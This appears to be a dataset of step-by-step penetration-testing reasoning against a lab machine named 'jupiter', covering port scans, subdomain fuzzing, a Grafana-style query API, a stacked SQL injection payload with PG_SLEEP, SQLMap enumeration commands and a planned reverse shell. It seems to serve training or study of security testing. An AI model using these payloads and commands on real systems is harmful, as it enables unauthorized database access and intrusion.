  1. **Investigate the Method Used:** Determine the specific exploit or misconfiguration that led to root access to ensure a comprehensive understanding and documentation of the security flaw.
  2. **System Audit:** Conduct a full system audit to identify any other potential vulnerabilities or system misconfigurations.
  3. **Patch and Remediate:** Apply necessary patches and adjustments to the system configurations to mitigate the vulnerability exploited for root access.
  4. **Enhance Monitoring and Logging:** Implement or enhance system monitoring and logging to detect future attempts at unauthorized access or privilege escalation.
  5. **Report and Document:** Document the findings, actions taken, and any changes implemented for future reference and to improve security posture.

This critical finding should prompt an immediate security response to prevent potential misuse or harm.",End the task,"1. **Evaluation of Previous Step Achievement**:
   - The previous steps outlined in the Penetration Testing Task List (PTT) culminated in the successful acquisition of root access on the target system. This achievement was confirmed by the results section, which indicated a critical security vulnerability was exploited to escalate privileges to the highest level.
   - The intended task of gaining root access, which is often the ultimate goal in penetration testing aimed at testing system security and identifying vulnerabilities, was achieved. This confirms the effectiveness of the strategies and methods employed during the testing process.

2. **Key Findings and Implications for Further Steps**:
   - **Successful Root Access**: Achieving root access indicates a significant security flaw in the system configuration or in the way certain system utilities, like `systemctl`, were managed. This level of access allows for a complete audit and understanding of the system's security posture.
   - **Implications of the Findings**: With root access, the tester has the ability to fully explore and document the system's vulnerabilities, leading to comprehensive insights into security weaknesses and potential improvements.
   - **Next Steps Outlined**: The results section suggests several next steps including a full system audit, patching and remediation of discovered vulnerabilities, enhancing monitoring and logging, and comprehensive documentation and reporting of the findings and actions taken.

3. **Strategy Evaluation and Conclusion**:
   - **End the Task**: Given that the primary objective of the penetration test—to gain root access and identify critical vulnerabilities—has been successfully achieved, the logical next step is to conclude the active penetration testing phase.
   - **Transition to Remediation and Documentation**: With the conclusion of the penetration testing, the focus should now shift to addressing the vulnerabilities that were uncovered. This includes patching the exploited vulnerabilities, securing system configurations, and implementing enhanced monitoring to prevent future breaches.
   - **Final Reporting**: It is essential to document the methodology, findings, and recommendations in a final report. This report will serve as a guide for the system administrators and security teams to understand the vulnerabilities, the impact of the findings, and the steps needed to secure the system.

The decision to end the task is justified by the achievement of the test's goals and the transition towards remediation and strengthening of the system's security posture. This ensures that the penetration test results are actionable and that the system's security is enhanced based on the findings.",End task and ask permission to generate the report,"1. **Evaluation of Task Completion**:
   - The Updated Penetration Testing Task List (PTT) indicates that all planned tasks, including reconnaissance, vulnerability analysis, exploitation, and privilege escalation, have been successfully completed. This includes achieving root access, which is typically the ultimate objective in penetration testing aimed at uncovering maximum vulnerabilities and assessing the security posture comprehensively.
   - The successful execution of these tasks, especially the exploitation of critical vulnerabilities leading to root access, signifies that the primary objectives of the penetration test have been met.

2. **Assessment of Findings and Their Implications**:
   - **Comprehensive Vulnerability Discovery**: The penetration test uncovered several critical vulnerabilities, including SQL injection, command injection, and misconfigurations related to SUID permissions. These findings are crucial for understanding the security weaknesses of the system.
   - **Achievement of Root Access**: Gaining root access has provided deep insights into the system's security flaws, allowing for a detailed assessment of potential risks and the impact of these vulnerabilities.
   - **Outlined Next Steps**: The results suggest necessary actions such as system audits, patching vulnerabilities, enhancing monitoring, and documenting the process and findings. These steps are essential for reinforcing the system’s security framework.

3. **Rationale for Ending the Task and Transitioning to Reporting**:
   - **Completion of Penetration Testing Goals**: With the achievement of the test’s objectives and a thorough exploration of the system's vulnerabilities, continuing the penetration test further may yield diminishing returns. The focus should now shift towards mitigating the identified risks.
   - **Importance of Reporting**: Documenting the findings, methodologies used, and recommendations in a detailed report is crucial. This report will serve as a foundational document for the system administrators and security teams to understand and rectify the security lapses effectively.
   - **Seeking Permission for Report Generation**: It is a standard practice and often a requirement in professional settings to seek formal permission to generate and deliver the penetration test report. This step ensures transparency, acknowledges the completion of the penetration testing phase, and formally transitions to the remediation phase.

**Conclusion**:
Ending the task at this stage is logical and appropriate given the successful completion of the testing objectives. The next immediate step is to seek permission to generate a comprehensive report. This report will encapsulate all critical findings, the exploitation methods used, and tailored recommendations for securing the system. This approach not only ensures adherence to professional and ethical standards but also facilitates effective communication and action based on the test results.",{'SQLmap': 'Investigate possible SQL injection'}
jupiter,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed) 
       1.3.1 Perform a port scan - {Findings: Host is up (0.13s latency). Open Ports: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu), HTTP Title: Did not follow redirect to http://jupiter.htb/, HTTP Server Header: nginx/1.18.0 (Ubuntu); Filtered Ports: 1477/tcp: Filtered, Service: capioverlan. Operating System: Linux, CPE: cpe:/o:linux:linux_kernel.}
       1.3.2 Determine the services and versions on each open port - {Findings: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu).}
   1.4 Target IP - 10.10.11.216",,,"**Nmap Scan Summary for 10.10.11.216:**

- **Host Status:** 
  - Host is up (0.13s latency).

- **Open Ports:**
  - **22/tcp:**
    - **State:** Open
    - **Service:** SSH
    - **Version:** OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
    - **Protocol:** 2.0
    - **SSH Host Keys:**
      - ECDSA: 256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32
      - ED25519: 256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41

  - **80/tcp:**
    - **State:** Open
    - **Service:** HTTP
    - **Version:** nginx 1.18.0 (Ubuntu)
    - **HTTP Title:** Did not follow redirect to http://jupiter.htb/
    - **HTTP Server Header:** nginx/1.18.0 (Ubuntu)

- **Filtered Ports:**
  - **1477/tcp:**
    - **State:** Filtered
    - **Service:** capioverlan

- **Service Info:**
  - **Operating System:** Linux
  - **CPE:** cpe:/o:linux:linux_kernel

**Note:** 997 closed TCP ports (connection refused) were not shown in the report.","Enumerat the port 80, HTTP service","1. The intended task of the previous step, which was to identify open ports and the services running on them, was achieved successfully. The Nmap scan revealed that port 80 is open and is running the HTTP service.

2. The key findings from the previous step include:
   - Port 80/tcp is open.
   - The service is identified as HTTP, running nginx version 1.18.0 (Ubuntu).
   - The HTTP title indicates that the server did not follow a redirect to http://jupiter.htb/.
   - The HTTP server header also confirms the version of nginx being used.

   These findings can lead to further steps in the penetration testing process, such as:
   - Conducting further enumeration of the HTTP service to identify potential vulnerabilities, misconfigurations, or additional endpoints that may be exploited.
   - Investigating the redirect behavior to understand why it did not follow the redirect and if this could be leveraged in any way.

3. Given that the previous step was successful and provided valuable information, it is reasonable to move forward with the same strategy of enumerating port 80 and the HTTP service. This approach will allow for a deeper understanding of the service and any potential vulnerabilities that may exist.","Enumerate further on the X service to find software versions, hidden directories and file.","1. The selected step of enumerating the HTTP service on port 80 is a logical progression from the previous findings that confirmed the service is running nginx version 1.18.0 (Ubuntu). This step aims to gather more detailed information about the HTTP service, which is crucial for identifying potential vulnerabilities or misconfigurations.

2. By using tools such as a web browser, curl, and gobuster for enumeration, we can achieve several objectives:
   - **Browser:** Using a web browser allows us to interact with the HTTP service directly. We can observe the response from the server, any visible content, and any potential redirects or error messages that may provide insights into the server's configuration.
   - **Curl:** This command-line tool is useful for making HTTP requests and analyzing the responses. It can help us retrieve headers, check for specific HTTP methods (like GET, POST), and explore various endpoints that may not be directly visible through the browser.
   - **Gobuster:** This tool is particularly effective for directory and file brute-forcing. It can help uncover hidden directories and files that may not be linked from the main page but could contain sensitive information or vulnerabilities.

3. The rationale behind this step is that the previous scan revealed an open HTTP service, which is often a target for exploitation due to common vulnerabilities in web applications. By enumerating further, we can identify software versions, which may have known vulnerabilities, and uncover hidden resources that could be exploited. This thorough examination of the HTTP service is essential for a comprehensive penetration testing strategy, as it allows us to gather actionable intelligence that can lead to further exploitation or assessment of the target system's security posture.","{'Web page interaction': 'Interact with the HTTP service using a web browser to observe responses and content.', 'Interactive CLI': 'Use curl to make HTTP requests and analyze responses, including headers and methods.', 'Dirbuster': 'Use Gobuster for directory and file brute-forcing to uncover hidden resources.'}"
jupiter,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed) 
       1.3.1 Perform a port scan - {Findings: Host is up (0.13s latency). Open Ports: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu), HTTP Title: Did not follow redirect to http://jupiter.htb/, HTTP Server Header: nginx/1.18.0 (Ubuntu); Filtered Ports: 1477/tcp: Filtered, Service: capioverlan. Operating System: Linux, CPE: cpe:/o:linux:linux_kernel.}
       1.3.2 Determine the services and versions on each open port - {Findings: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu).}
       1.3.3 Enumerate the HTTP service - {Findings: Discovered Subdomain: kiosk; Status Code: 200; Response Size: 34,390 bytes; Word Count: 2,150; Line Count: 212; Duration: 135 ms.}
   1.4 Target IP - 10.10.11.216","Enumerat the port 80, HTTP service","1. The selected step of enumerating the HTTP service on port 80 is a logical progression from the previous findings that confirmed the service is running nginx version 1.18.0 (Ubuntu). This step aims to gather more detailed information about the HTTP service, which is crucial for identifying potential vulnerabilities or misconfigurations.

2. By using tools such as a web browser, curl, and gobuster for enumeration, we can achieve several objectives:
   - **Browser:** Using a web browser allows us to interact with the HTTP service directly. We can observe the response from the server, any visible content, and any potential redirects or error messages that may provide insights into the server's configuration.
   - **Curl:** This command-line tool is useful for making HTTP requests and analyzing the responses. It can help us retrieve headers, check for specific HTTP methods (like GET, POST), and explore various endpoints that may not be directly visible through the browser.
   - **Gobuster:** This tool is particularly effective for directory and file brute-forcing. It can help uncover hidden directories and files that may not be linked from the main page but could contain sensitive information or vulnerabilities.

3. The rationale behind this step is that the previous scan revealed an open HTTP service, which is often a target for exploitation due to common vulnerabilities in web applications. By enumerating further, we can identify software versions, which may have known vulnerabilities, and uncover hidden resources that could be exploited. This thorough examination of the HTTP service is essential for a comprehensive penetration testing strategy, as it allows us to gather actionable intelligence that can lead to further exploitation or assessment of the target system's security posture.","**FFUF Scan Summary for http://jupiter.htb:80/**

- **Method:** GET
- **URL:** http://jupiter.htb:80/
- **Wordlist Used:** 
  - FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
- **Custom Header:** Host: FUZZ.jupiter.htb
- **Follow Redirects:** False
- **Calibration:** False
- **Timeout:** 10 seconds
- **Threads:** 50
- **Matcher:** Response status: all
- **Filter:** Excluded Response status: 301

- **Results:**
  - **Status Code:** 200
  - **Response Size:** 34,390 bytes
  - **Word Count:** 2,150
  - **Line Count:** 212
  - **Duration:** 135 ms
  - **Discovered Subdomain:** kiosk

**Note:** The scan was configured to check for all response statuses while filtering out 301 redirects.",Check the source code of the page,"1. The intended task of the previous step, which was to enumerate the HTTP service, was achieved successfully. The FFUF scan revealed that there is a subdomain called ""kiosk"" and provided various metrics about the response from the server, including a status code of 200, response size, word count, line count, and duration of the request. 

2. The key findings from the previous step include:
   - The discovery of a subdomain ""kiosk"" that could potentially lead to further exploration.
   - The HTTP response indicating that the service is active and responding correctly.
   - However, while the scan provided some useful metrics, it did not uncover specific vulnerabilities or additional hidden resources beyond the subdomain.

   These findings suggest that while there is an active service, there may still be more information available that could be discovered by examining the content served by the HTTP service. Checking the source code of the webpage can reveal hidden comments, JavaScript files, or other resources that may contain sensitive information or clues about potential vulnerabilities.

3. Given that the previous step was successful but did not yield extensive information, it is logical to move forward with the strategy of checking the source code of the page. This step can provide deeper insights into the application, including any hardcoded credentials, misconfigurations, or references to additional resources that might not have been discovered through the previous enumeration techniques. By analyzing the source code, we can enhance our understanding of the web application's structure and functionality, potentially leading to further avenues for exploitation or assessment of security posture.","Further Enumerate the website. - hidden directories, links and software","1. The selected step of further enumerating the website by checking the source code of the page is a logical continuation of the previous findings. The earlier enumeration of the HTTP service revealed a functioning web application, but it did not provide in-depth insights into its underlying structure or functionality. By examining the source code, we can uncover additional information that may not be visible through standard browsing or automated scanning tools.

2. The rationale behind this step includes:
   - **Hidden Directories and Links:** The source code may contain references to hidden directories, endpoints, or files that are not directly accessible through the web interface. These could provide additional attack vectors or sensitive information.
   - **Software Information:** The source code might reveal the technologies used to build the application, including libraries, frameworks, or even specific software versions that could have known vulnerabilities.
   - **Functionality Insights:** By analyzing the source code, we can gain a better understanding of how the web application functions, including any business logic that may be exploitable or any security misconfigurations that could be leveraged.

3. Since the previous step successfully identified a subdomain and provided some basic metrics about the HTTP service, but did not delve into the specifics of the web application itself, it is prudent to move forward with the strategy of further enumerating the website. This step is essential for gathering detailed information about the web application’s functionality, which can lead to identifying potential vulnerabilities or weaknesses in the application's security posture. By thoroughly examining the source code, we can enhance our overall assessment and potentially uncover critical information that could be exploited in a penetration testing scenario.","{'Web page interaction': 'Examine the source code of the web application to identify hidden directories, links, and software information.'}"
jupiter,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed) 
       1.3.1 Perform a port scan - {Findings: Host is up (0.13s latency). Open Ports: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu), HTTP Title: Did not follow redirect to http://jupiter.htb/, HTTP Server Header: nginx/1.18.0 (Ubuntu); Filtered Ports: 1477/tcp: Filtered, Service: capioverlan. Operating System: Linux, CPE: cpe:/o:linux:linux_kernel.}
       1.3.2 Determine the services and versions on each open port - {Findings: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu).}
       1.3.3 Enumerate the HTTP service - {Findings: Discovered Subdomain: kiosk; Status Code: 200; Response Size: 34,390 bytes; Word Count: 2,150; Line Count: 212; Duration: 135 ms.}
       1.3.4 Further Enumerate the website - {Findings: Identified API Endpoint: http://kiosk.jupiter.htb/api/ds/query; Data Source: PostgreSQL database.}
   1.4 Target IP - 10.10.11.216",Check the source code of the page,"1. The selected step of further enumerating the website by checking the source code of the page is a logical continuation of the previous findings. The earlier enumeration of the HTTP service revealed a functioning web application, but it did not provide in-depth insights into its underlying structure or functionality. By examining the source code, we can uncover additional information that may not be visible through standard browsing or automated scanning tools.

2. The rationale behind this step includes:
   - **Hidden Directories and Links:** The source code may contain references to hidden directories, endpoints, or files that are not directly accessible through the web interface. These could provide additional attack vectors or sensitive information.
   - **Software Information:** The source code might reveal the technologies used to build the application, including libraries, frameworks, or even specific software versions that could have known vulnerabilities.
   - **Functionality Insights:** By analyzing the source code, we can gain a better understanding of how the web application functions, including any business logic that may be exploitable or any security misconfigurations that could be leveraged.

3. Since the previous step successfully identified a subdomain and provided some basic metrics about the HTTP service, but did not delve into the specifics of the web application itself, it is prudent to move forward with the strategy of further enumerating the website. This step is essential for gathering detailed information about the web application’s functionality, which can lead to identifying potential vulnerabilities or weaknesses in the application's security posture. By thoroughly examining the source code, we can enhance our overall assessment and potentially uncover critical information that could be exploited in a penetration testing scenario.","**Web Application Analysis Summary:**

- **Tool Used:** Browser Developer Tools
- **Focus Area:** Network Tab

- **Findings:**
  - Upon refreshing the page, the web application makes several queries to:
    - **Endpoint:** http://kiosk.jupiter.htb/api/ds/query
    - **Data Source:** Appears to be a PostgreSQL database.

**Implications for Further Enumeration:**
- The identified API endpoint may be a target for further testing, particularly for SQL injection and data extraction vulnerabilities.
- Investigating the queries made to this endpoint can provide insights into the application's interactions with the database and potential security weaknesses.",Analyse the requests in the web application,"1. The intended task of the previous step, which was to further enumerate the website, was achieved successfully. The analysis revealed a significant finding: the identification of an API endpoint at `http://kiosk.jupiter.htb/api/ds/query`, which interacts with a PostgreSQL database. 

2. The key findings include:
   - The existence of an API endpoint that may accept user input and interact with a database. This is crucial as it opens up possibilities for further testing, particularly for SQL injection vulnerabilities.
   - Understanding that the application communicates with a PostgreSQL database indicates that certain types of SQL injection techniques may be applicable. This can lead to potential data extraction or manipulation if the application does not properly sanitize inputs.

   These findings suggest that there is an opportunity to explore the requests made to this API endpoint in detail. By analyzing these requests, we can determine if there are any parameters that can be manipulated to test for vulnerabilities such as SQL injection.

3. Given that the previous step successfully identified an API endpoint with a backend database, it is logical to move forward with the strategy of analyzing the requests in the web application. This step is essential for understanding how the application handles input and whether there are any weaknesses that can be exploited. By focusing on the requests, we can look for opportunities to manipulate them to perform a SQL injection attack or other types of exploitation, thereby enhancing our overall assessment of the application's security posture. This approach aligns well with the goal of identifying vulnerabilities and is a natural progression from the previous findings.","Further Enumerate the website. - hidden directories, links and software","1. The selected step of further enumerating the website by analyzing the requests in the web application is a logical continuation of the previous findings. The prior enumeration revealed an API endpoint (`http://kiosk.jupiter.htb/api/ds/query`) that interacts with a PostgreSQL database, indicating a potential area for vulnerability assessment. 

2. The rationale behind this step includes:
   - **API Interaction:** The existence of an API endpoint suggests that the application may accept parameters that could be manipulated. Analyzing these requests can help identify whether user inputs are sanitized and if they are vulnerable to SQL injection attacks.
   - **Burp Suite Utilization:** Using a tool like Burp Suite allows for in-depth examination and manipulation of HTTP requests and responses. This can facilitate the testing of various payloads to determine if the application is susceptible to SQL injection.
   - **Hidden Directories and Links:** While the focus is on the API endpoint, the exploration may also reveal hidden directories or links that could lead to additional attack vectors or sensitive information.

3. Since the previous step successfully identified an API endpoint linked to a PostgreSQL database, moving forward with the strategy of further enumerating the website by analyzing the requests is a prudent choice. This step is crucial for assessing the security of the web application, as it allows for direct interaction with the API. By exploring the requests using Burp Suite, we can test for SQL injection vulnerabilities and potentially uncover weaknesses that could be exploited. This approach is aligned with the goal of identifying and understanding vulnerabilities within the web application, making it a logical next step in the reconnaissance process.","{'Web page interaction': 'Further enumerate the website by analyzing requests, hidden directories, links, and software.'}"
jupiter,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed) 
       1.3.1 Perform a port scan - {Findings: Host is up (0.13s latency). Open Ports: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu), HTTP Title: Did not follow redirect to http://jupiter.htb/, HTTP Server Header: nginx/1.18.0 (Ubuntu); Filtered Ports: 1477/tcp: Filtered, Service: capioverlan. Operating System: Linux, CPE: cpe:/o:linux:linux_kernel.}
       1.3.2 Determine the services and versions on each open port - {Findings: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu).}
       1.3.3 Enumerate the HTTP service - {Findings: Discovered Subdomain: kiosk; Status Code: 200; Response Size: 34,390 bytes; Word Count: 2,150; Line Count: 212; Duration: 135 ms.}
       1.3.4 Further Enumerate the website - {Findings: Identified API Endpoint: http://kiosk.jupiter.htb/api/ds/query; Data Source: PostgreSQL database.}
   1.4 SQL Injection Testing - {Findings: Parameter Analyzed: JSON raw$q (custom POST); Type: Stacked queries; Payload Executed: {""queries"":[{""refId"":""A"",""datasource"":{""type"":""postgres"",""uid"":""Yt5Lg-Vz""},""rawSql"":""select name as \""Name\"", parent as \""Parent Planet\"", meaning as \""Name Meaning\"" from moons where parent = 'Saturn' order by name desc;SELECT PG_SLEEP(5)--"",""format"":""table"",""datasourceId"":1,""intervalMs"":60000,""maxDataPoints"":937}]; Time-Based Payload: Implemented PG_SLEEP(5) to test for SQL injection vulnerability.}
   1.5 Target IP - 10.10.11.216",Analyse the requests in the web application,"1. The selected step of further enumerating the website by analyzing the requests in the web application is a logical continuation of the previous findings. The prior enumeration revealed an API endpoint (`http://kiosk.jupiter.htb/api/ds/query`) that interacts with a PostgreSQL database, indicating a potential area for vulnerability assessment. 

2. The rationale behind this step includes:
   - **API Interaction:** The existence of an API endpoint suggests that the application may accept parameters that could be manipulated. Analyzing these requests can help identify whether user inputs are sanitized and if they are vulnerable to SQL injection attacks.
   - **Burp Suite Utilization:** Using a tool like Burp Suite allows for in-depth examination and manipulation of HTTP requests and responses. This can facilitate the testing of various payloads to determine if the application is susceptible to SQL injection.
   - **Hidden Directories and Links:** While the focus is on the API endpoint, the exploration may also reveal hidden directories or links that could lead to additional attack vectors or sensitive information.

3. Since the previous step successfully identified an API endpoint linked to a PostgreSQL database, moving forward with the strategy of further enumerating the website by analyzing the requests is a prudent choice. This step is crucial for assessing the security of the web application, as it allows for direct interaction with the API. By exploring the requests using Burp Suite, we can test for SQL injection vulnerabilities and potentially uncover weaknesses that could be exploited. This approach is aligned with the goal of identifying and understanding vulnerabilities within the web application, making it a logical next step in the reconnaissance process.","**SQLMap Scan Summary:**

- **Tool Used:** SQLMap
- **Command Executed:** `-r r1 --fresh-queries --batch --dbms postgresql`
- **Start Time:** 06:37:56 on 2023-06-07
- **Request Source:** Parsed HTTP request from 'r1' (JSON data found in POST body)

- **Key Findings:**
  - **Parameter Analyzed:** JSON raw$q (custom POST)
  - **Type:** Stacked queries
  - **Title:** PostgreSQL > 8.1 stacked queries (comment)
  - **Payload Executed:**
    ```json
    {
      ""queries"": [
        {
          ""refId"": ""A"",
          ""datasource"": {
            ""type"": ""postgres"",
            ""uid"": ""Yt5Lg-Vz""
          },
          ""rawSql"": ""select name as \""Name\"", parent as \""Parent Planet\"", meaning as \""Name Meaning\"" from moons where parent = 'Saturn' order by name desc;SELECT PG_SLEEP(5)--"",
          ""format"": ""table"",
          ""datasourceId"": 1,
          ""intervalMs"": 60000,
          ""maxDataPoints"": 937
        }
      ]
    }
    ```
  - **Time-Based Payload:** Implemented `PG_SLEEP(5)` to test for SQL injection vulnerability.

- **Additional Information:**
  - **Web Server Operating System:** Linux Ubuntu
  - **Web Application Technology:** Nginx 1.18.0
  - **Back-End DBMS:** PostgreSQL

- **End Time:** 06:38:13 on 2023-06-07

**Notes:**
- SQLMap prompted for optimization of delay responses during testing.
- A warning was issued about not stressing the network connection with time-based payloads to avoid potential disruptions.",Try sql injection attacks on the web page,"1. The intended task of the previous step, which involved analyzing requests in the web application for potential SQL injection vulnerabilities, was achieved successfully. The SQLMap scan provided key findings that indicated a parameter in the JSON payload (`rawSql`) was susceptible to SQL injection. Specifically, the test implemented a time-based payload (`PG_SLEEP(5)`) to confirm the vulnerability.

2. The key findings from the previous step include:
   - The identification of a vulnerable parameter (`raw$q`) in the JSON POST request that accepted SQL queries.
   - The successful execution of a payload that included the `PG_SLEEP(5)` function, which is a common technique to test for SQL injection vulnerabilities by introducing a deliberate delay in the response.
   - The ability to utilize stacked queries in PostgreSQL, indicating that the application may allow for complex SQL commands to be executed, further increasing the potential for exploitation.

   These findings suggest that there is a clear path to further exploiting this vulnerability. By crafting additional SQL injection payloads, we can attempt to extract sensitive data from the database, manipulate data, or further assess the application's security posture.

3. Given that the previous step successfully identified a vulnerability and provided a clear target for exploitation, it is logical to move forward with the strategy of attempting SQL injection attacks on the web page. This step is crucial for actively testing the application's defenses and determining the extent of the vulnerability. By using the intercepted request from Burp Suite, we can craft specific SQL injection payloads to test the application's response and potentially gain unauthorized access to sensitive information or functionality. This approach aligns well with the goal of identifying and understanding vulnerabilities within the web application, making it a natural next step in the penetration testing process.",Exploit the selected exploitations,"1. The selected step of exploiting the identified SQL injection vulnerabilities using SQLMap is a logical continuation of the previous findings. The prior analysis confirmed that the application is vulnerable to SQL injection, specifically through the parameter (`raw$q`) in the JSON payload of the POST request. The successful execution of a time-based payload (`PG_SLEEP(5)`) demonstrated that the application allowed for the execution of arbitrary SQL queries, indicating a significant security flaw.

2. The rationale behind this step includes:
   - **Confirmed Vulnerability:** The previous step established that the application is susceptible to SQL injection, which provides a clear opportunity for exploitation. This vulnerability can potentially allow an attacker to manipulate the database, extract sensitive information, or escalate privileges.
   - **Use of SQLMap:** SQLMap is a powerful tool designed specifically for automating the process of detecting and exploiting SQL injection vulnerabilities. By using SQLMap, we can efficiently test various payloads, extract data, and potentially automate the exploitation process to gather valuable information from the database.
   - **Targeting Specific Data:** This step allows us to focus on exploiting the vulnerability to extract specific data from the PostgreSQL database, such as user credentials, sensitive application data, or configuration settings that could aid in further attacks.

3. Since the previous step successfully identified a vulnerability and provided a means to exploit it, moving forward with the strategy of executing SQL injection attacks using SQLMap is a prudent choice. This step is critical for actively testing the application's defenses and assessing the extent of the vulnerability. By leveraging SQLMap to automate the exploitation, we can maximize our efficiency and effectiveness in gathering information from the database. This approach aligns perfectly with the goal of identifying and understanding vulnerabilities within the web application, making it a logical next step in the penetration testing process.",{'SQLmap': 'Exploit the identified SQL injection vulnerabilities using SQLMap to extract data from the PostgreSQL database.'}
jupiter,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed) 
       1.3.1 Perform a port scan - {Findings: Host is up (0.13s latency). Open Ports: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu), HTTP Title: Did not follow redirect to http://jupiter.htb/, HTTP Server Header: nginx/1.18.0 (Ubuntu); Filtered Ports: 1477/tcp: Filtered, Service: capioverlan. Operating System: Linux, CPE: cpe:/o:linux:linux_kernel.}
       1.3.2 Determine the services and versions on each open port - {Findings: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu).}
       1.3.3 Enumerate the HTTP service - {Findings: Discovered Subdomain: kiosk; Status Code: 200; Response Size: 34,390 bytes; Word Count: 2,150; Line Count: 212; Duration: 135 ms.}
       1.3.4 Further Enumerate the website - {Findings: Identified API Endpoint: http://kiosk.jupiter.htb/api/ds/query; Data Source: PostgreSQL database.}
   1.4 SQL Injection Testing - {Findings: Parameter Analyzed: JSON raw$q (custom POST); Type: Stacked queries; Payload Executed: {""queries"":[{""refId"":""A"",""datasource"":{""type"":""postgres"",""uid"":""Yt5Lg-Vz""},""rawSql"":""select name as \""Name\"", parent as \""Parent Planet\"", meaning as \""Name Meaning\"" from moons where parent = 'Saturn' order by name desc;SELECT PG_SLEEP(5)--"",""format"":""table"",""datasourceId"":1,""intervalMs"":60000,""maxDataPoints"":937}]; Time-Based Payload: Implemented PG_SLEEP(5) to test for SQL injection vulnerability.}
   1.5 SQL Injection Exploitation - {Findings: Tool Used: SQLMap; Command Executed: -r r1 --fresh-queries --batch --dbms postgresql --time-sec=1 --current-user --current-db --hostname --is-dba --privileges --dbs --tables; Current User: grafana_viewer; Current Database (Schema): public; Current User is DBA: True; Available Databases: public; Number of Tables in 'public': 1 table; Table Name: moons. current_setting('is_superuser')}
   1.6 Target IP - 10.10.11.216",Try sql injection attacks on the web page,"1. The selected step of exploiting the identified SQL injection vulnerabilities using SQLMap is a logical continuation of the previous findings. The prior analysis confirmed that the application is vulnerable to SQL injection, specifically through the parameter (`raw$q`) in the JSON payload of the POST request. The successful execution of a time-based payload (`PG_SLEEP(5)`) demonstrated that the application allowed for the execution of arbitrary SQL queries, indicating a significant security flaw.

2. The rationale behind this step includes:
   - **Confirmed Vulnerability:** The previous step established that the application is susceptible to SQL injection, which provides a clear opportunity for exploitation. This vulnerability can potentially allow an attacker to manipulate the database, extract sensitive information, or escalate privileges.
   - **Use of SQLMap:** SQLMap is a powerful tool designed specifically for automating the process of detecting and exploiting SQL injection vulnerabilities. By using SQLMap, we can efficiently test various payloads, extract data, and potentially automate the exploitation process to gather valuable information from the database.
   - **Targeting Specific Data:** This step allows us to focus on exploiting the vulnerability to extract specific data from the PostgreSQL database, such as user credentials, sensitive application data, or configuration settings that could aid in further attacks.

3. Since the previous step successfully identified a vulnerability and provided a means to exploit it, moving forward with the strategy of executing SQL injection attacks using SQLMap is a prudent choice. This step is critical for actively testing the application's defenses and assessing the extent of the vulnerability. By leveraging SQLMap to automate the exploitation, we can maximize our efficiency and effectiveness in gathering information from the database. This approach aligns perfectly with the goal of identifying and understanding vulnerabilities within the web application, making it a logical next step in the penetration testing process.","**SQLMap Scan Summary:**

- **Tool Used:** SQLMap
- **Command Executed:** `-r r1 --fresh-queries --batch --dbms postgresql --time-sec=1 --current-user --current-db --hostname --is-dba --privileges --dbs --tables`
- **Start Time:** 06:47:50

- **Key Findings:**
  - **Testing DBMS:** PostgreSQL
  - **Web Server OS:** Linux Ubuntu
  - **Web Application Technology:** Nginx 1.18.0
  - **Back-End DBMS:** PostgreSQL

- **User and Database Information:**
  - **Current User:** `grafana_viewer`
  - **Current Database (Schema):** `public`
  - **Current User is DBA:** True

- **Databases Available:**
  - **Available Databases:** 
    - `public`

- **Tables in Current Database:**
  - **Number of Tables in 'public':** 1 table
    - **Table Name:** `moons`

**Notes:**
- The current user has DBA privileges, which may allow for elevated access and manipulation of the database.
- The information retrieved can be leveraged for further exploitation and testing of the database's security posture.",Get a reverese shell using the SQL injection,"1. The intended task of the previous step, which involved exploiting the identified SQL injection vulnerabilities using SQLMap, was achieved successfully. The SQLMap scan provided critical information regarding the database and user privileges, confirming that the current user (`grafana_viewer`) has DBA privileges and access to the `public` database, which contains a table named `moons`.

2. The key findings from the previous step include:
   - The current user has DBA privileges, which allows for elevated access and manipulation of the database.
